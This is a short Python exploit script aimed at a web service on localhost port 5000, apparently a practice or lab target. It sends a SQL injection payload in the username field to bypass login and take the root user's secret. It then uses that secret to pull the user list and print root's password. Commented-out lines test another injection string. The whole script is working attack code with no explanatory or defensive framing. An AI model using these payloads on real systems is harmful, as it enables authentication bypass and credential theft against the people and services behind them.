#!/usr/bin/env python3
import requests

# Will obtain the root's secret
ploads = {'username': "root' -- ",'password': "password"}
r = requests.get('http://127.0.0.1:5000',params=ploads)
r_dictionary = r.json()
secret = r_dictionary["secret"]

# Will obtain the root's password
ploads = {'secret': secret}
r = requests.get('http://127.0.0.1:5000/users',params=ploads)
r_dictionary = r.json()
for i in r_dictionary:
    v = list(i.values())
    if v[1] == "root":
        password = v[0]
        break

print("Password: {}".format(password))
print("Secret: {}".format(secret))

# next code is used for testing whether substitution of parameters work
# Used only for test purposes
# ploads = {'secret': "333b87e6-7675-426d-af15-ea36d5d5b944' AND '1' = '1"}
# ploads = {'secret': "333b87e6-7675-426d-af15-ea36d5d5b944"}
# r = requests.get('http://127.0.0.1:5000/users',params=ploads)
# print(r.text)
# exit(1)



